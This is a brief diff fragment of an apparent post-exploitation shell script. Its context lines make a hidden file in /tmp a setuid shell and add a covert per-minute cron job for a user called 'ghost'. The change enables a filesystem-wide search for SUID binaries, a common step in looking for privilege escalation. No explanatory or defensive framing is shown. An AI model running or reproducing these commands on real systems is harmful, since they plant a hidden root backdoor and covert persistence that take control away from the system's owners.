@@ -8,4 +8,4 @@ sudo chmod u+s /tmp/.hidden-shell
 echo "* * * * * echo 'alive' >> /tmp/.heartbeat" | sudo crontab -u ghost -
 
 
-# sudo find / -perm -4000 -type f 2>/dev/null
+sudo find / -perm -4000 -type f 2>/dev/null
